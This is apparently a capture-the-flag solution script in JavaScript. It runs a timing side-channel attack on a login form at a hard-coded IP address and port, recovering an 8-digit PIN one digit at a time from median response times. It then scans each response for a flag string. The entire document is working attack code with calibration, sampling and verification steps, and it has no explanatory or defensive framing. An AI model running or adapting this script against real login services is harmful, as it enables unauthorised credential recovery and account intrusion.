const sleep = ms => new Promise(r => setTimeout(r, ms));

const TARGET_URL = 'http://178.128.110.55:7019/login'; 
const FLAG_PATTERN = /(CTF\{[^}]+\}|A1S\{[^}]+\}|flag\{[^}]+\}|[A-Z0-9]+\{[^}]+\})/i;

// 1. RESPECT THE SERVER LIMIT
const RATE_LIMIT_DELAY = 600; 

async function measureTime(password) {
    const start = performance.now();
    try {
        const formData = new FormData();
        formData.append('username', 'hakdog');
        formData.append('password', password);

        const res = await fetch(TARGET_URL, { method: 'POST', body: formData });
        const text = await res.text();
        
        const match = text.match(FLAG_PATTERN);
        if (match) {
            console.log(`\n\n[+] SUCCESS! Password: ${password} | Flag: ${match[0]}\n`);
            process.exit(0);
        }
    } catch (e) {}
    
    const end = performance.now();
    
    // Sleep AFTER the measurement so the rate-limit delay doesn't skew our timer
    await sleep(RATE_LIMIT_DELAY); 
    return end - start;
}

async function getMedianTime(password, samples = 3) {
    let times = [];
    for (let i = 0; i < samples; i++) {
        times.push(await measureTime(password));
    }
    times.sort((a, b) => a - b);
    return times[Math.floor(samples / 2)]; 
}

async function exploitTiming() {
    console.log(`Starting Advanced Timing Attack on ${TARGET_URL}...\n`);

    // 2. FIND A DEAD DIGIT FOR SAFE PADDING
    console.log("[*] Phase 1: Calibrating safe padding...");
    let minTime = Infinity;
    let safePad = "0";
    
    for (let i = 0; i <= 9; i++) {
        let char = String(i);
        let time = await getMedianTime(char.repeat(8), 2); // 2 samples is enough for calibration
        console.log(`    Testing padding '${char.repeat(8)}' -> Median response: ${Math.round(time)}ms`);
        
        if (time < minTime) {
            minTime = time;
            safePad = char;
        }
    }
    console.log(`\n[+] Safe Padding Digit Selected: '${safePad}' (Lowest accidental matches)\n`);

    let knownPassword = "";
    console.log("[*] Phase 2: Extracting Password...");

    for (let position = 0; position < 8; position++) {
        let maxTime = 0;
        let bestDigit = "0";
        let timingsStr = "";

        process.stdout.write(`[*] Testing position ${position + 1}/8... `);

        for (let digit = 0; digit <= 9; digit++) {
            // Use our safe pad instead of blindly using '0'
            let guess = knownPassword + digit + safePad.repeat(7 - position);
            
            let time = await getMedianTime(guess, 3); 
            timingsStr += `${digit}:${Math.round(time)}ms  `;
            
            if (time > maxTime) {
                maxTime = time;
                bestDigit = digit.toString();
            }
        }
        
        knownPassword += bestDigit;
        console.log(`\n    Timings: ${timingsStr}`);
        console.log(`[+] Position ${position + 1} locked: ${bestDigit} | Current pin: ${knownPassword}\n`);
    }
    
    console.log(`[*] Final extracted password: ${knownPassword}`);
    console.log("[*] Verifying final password...");
    await measureTime(knownPassword);
}

exploitTiming();